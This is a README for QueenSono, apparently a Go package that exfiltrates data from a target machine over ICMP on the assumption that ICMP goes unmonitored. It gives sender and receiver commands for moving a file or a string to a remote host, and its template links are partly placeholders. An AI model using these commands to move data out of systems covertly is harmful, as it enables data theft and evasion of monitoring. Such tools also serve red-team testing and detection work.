# QueenSono
A Golang Package for Data Exfiltration with ICMP protocol. Try to imitate https://github.com/ytisf/PyExfil (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be usefupl)

***Notes:***
- only work on Linux 
- need cap_net_raw capabilities
- Only rely on the fact that ICMP protocol isn't monitored (could be detected with a rigorous inspection of ICMP packet content or frequency)

## ICMP
https://github.com/cyb3rw01f/icmpExfiltrater (avec command on serverside)
https://github.com/martinoj2009/ICMPExfil

## options
$ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt && ./qssender send file -d 2 -l 127.0.0.1 -r 10.0.2.15 bible.txt -s 50000
$ ./qsreceiver receive -l 10.0.2.15 -p -f received_bible.txt


$./qssender send "thisisatest i want to send a string w/o waiting for the echo reply " -d 1 -l 127.0.0.1 -r 10.0.2.15 go.mod -s 1 -N
$./qsreceiver receive truncated 1 -l 10.0.2.15

<p hidden>add encryption + integrity check</p>

<div align=center>
<h1>Queen Sono<h1>
</div>
 
<br />
<p align="center">

  <h2 align="center">QueenSono <i> ICMP Data Exfiltration </i></h2>
<h3align="center"> A Golang Package for Data Exfiltration with ICMP protocol. Try to imitate https://github.com/ytisf/PyExfil (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be usefupl)</h3>
  <p align="center">
    <br />
    <a href="https://github.com/othneildrew/Best-README-Template"><strong>How to install it</strong></a>
    <br />
    <br />
    <a href="https://github.com/othneildrew/Best-README-Template">Use it </a>
    ·
    <a href="https://github.com/othneildrew/Best-README-Template/issues">Notes</a>
    ·
    <a href="https://github.com/ariary/QueenSono/issues">Request Feature</a>
  </p>
</p>

